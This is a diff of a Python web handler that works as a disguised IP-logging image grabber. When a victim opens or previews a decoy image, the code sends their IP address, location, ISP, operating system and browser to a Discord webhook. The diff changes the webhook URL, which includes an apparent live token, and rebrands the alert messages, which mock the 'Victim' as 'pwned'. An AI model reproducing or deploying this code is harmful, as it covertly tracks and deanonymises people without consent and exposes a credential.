@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discordapp.com/api/webhooks/1189599036261535905/lVvyid9he4PmctiM5PZmeNX5sUHzQDFaj9hJAt_dEyt029y4ETO_KHiSPj3J96kUp_K_'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
@@ -10,15 +10,15 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
-  "content": "@everyone",
+  "username": "Diddy Blud",
+  "content": "@668087301603328011",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Bahaha someone got pwned!",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "Diddy Blud"
       },
       "fields": [
         {
@@ -46,7 +46,7 @@ def prev(ip,uag):
       "color": 16711803,
       "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "Diddy Blud"
       },
       "fields": [
       ]
